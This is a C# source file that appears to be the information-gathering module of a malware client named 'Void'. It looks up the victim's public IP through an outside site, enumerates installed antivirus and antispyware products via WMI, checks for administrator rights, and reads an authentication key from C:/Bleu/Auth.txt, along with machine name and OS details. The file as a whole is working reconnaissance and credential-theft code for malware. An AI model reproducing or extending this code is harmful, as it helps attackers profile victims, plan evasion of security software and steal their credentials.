using System;
using System.Net;
using System.IO;
using System.Text;
using System.Security.Principal;
using System.Management;
using System.Collections.Generic;

namespace Void_client.Libs
{
    class InfoGathering
    {
        //attempts to get the user's public ip
        public static string GetIP()
        {
            WebClient client = new WebClient();

            string ip;

            try
            {
                ip = client.DownloadString("https://wtfismyip.com/text");
            }
            catch (Exception)
            {
                ip = "unable to recieve IP";
            }

            return ip;
        }

        //gets the antivirus and spyware installed as a service on the user's computer
        public static string GetProtectionSoftware()
        {
            try
            {
                ManagementObjectCollection aVirus = Query("AntivirusProduct");
                ManagementObjectCollection aSVirus = Query("AntiSpywareProduct");

                StringBuilder builder = new StringBuilder();

                builder.AppendLine("Antivirus:");

                foreach (var av in aVirus)
                    builder.AppendLine(AddPSoftware(av));

                builder.AppendLine("Anti spyware:");

                foreach (var asv in aSVirus)
                    builder.AppendLine(AddPSoftware(asv));

                return builder.ToString();
            }
            catch (Exception)
            {
                return "failed";
            }
        }

        private static string AddPSoftware(ManagementBaseObject obj)
        {
            return $"name: {obj["displayname"].ToString()}";
        }

        private static ManagementObjectCollection Query(string item)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "SELECT * FROM " + item);
            return searcher.Get();
        }

        //checks if the client is admin
        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
        }

        //atempts to get the user's bleu key if there is any
        public static string GetBleuKey()
        {
            string path = "C:/Bleu/Auth.txt";
            if (File.Exists(path))
            {
                try
                {
                    return File.ReadAllText(path);
                }
                catch (Exception)
                {
                    return "failed";
                }
            }
            else
                return "no bleu key";
        }

        public static string GetMachineName()
        {
            return Environment.MachineName;
        }

        public static string GetWinVersion()
        {
            return Environment.OSVersion.ToString();
        }

        public static string GetBits()
        {
            return (Environment.Is64BitOperatingSystem ? "64" : "32") + " bits";
        }
    }
}
